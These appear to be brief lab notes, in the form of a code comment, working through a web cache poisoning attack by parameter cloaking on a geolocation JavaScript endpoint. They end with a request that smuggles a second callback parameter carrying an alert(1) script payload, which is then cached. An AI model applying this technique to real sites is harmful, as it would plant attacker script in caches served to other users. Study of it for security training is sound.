/*

1) parameter parsing inconsistency between back end and the cache is proposed

2) GET /js/geolocate.js?callback=setCountryCookie HTTP/2
// probably our target to execute xss alert
// send to repeater

3) GET /js/geolocate.js?callback=setCountryCookie;utm_content=1 HTTP/2
// is treated as one parameter
// no change in response
// gets cached

4) GET /js/geolocate.js?callback=setCountryCookie&utm_content=1 HTTP/2
// is treated as two parameters
// no change in response
// gets cached

5) how about
GET /js/geolocate.js?callback=setCountryCookie&utm_content=1;callback=alert(1) HTTP/2
// keep sending to miss X-cache then repeat to put this in cache
// the 2 servers assume differently the callback parameter 
// and the second one gets reflected in the response



*/